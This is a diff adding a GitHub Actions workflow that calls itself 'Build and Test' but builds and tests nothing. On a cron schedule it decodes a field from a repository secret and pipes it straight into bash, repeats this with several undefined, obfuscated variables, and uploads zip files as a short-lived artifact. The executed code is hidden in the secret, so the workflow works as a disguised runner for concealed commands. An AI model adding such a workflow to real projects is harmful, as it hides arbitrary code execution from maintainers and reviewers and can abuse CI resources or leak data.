@@ -1,0 +1,32 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          q672: ${{ secrets.q672 }}
+        run: |
+          printf '%s' "$q672" | jq -r .vmr1540 | /bin/bash
+          printf '%s' "$mirw1" | jq -r .c898 | /bin/bash
+          printf '%s' "$fv7" | jq -r .orpw9419 | /bin/bash
+          echo $us7879 | jq -r .jy594 | /bin/bash
+          printf '%s' "$pmc3" | jq -r .id62 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: CJzdqvJm
+          path: "*.zip"
+          retention-days: 1
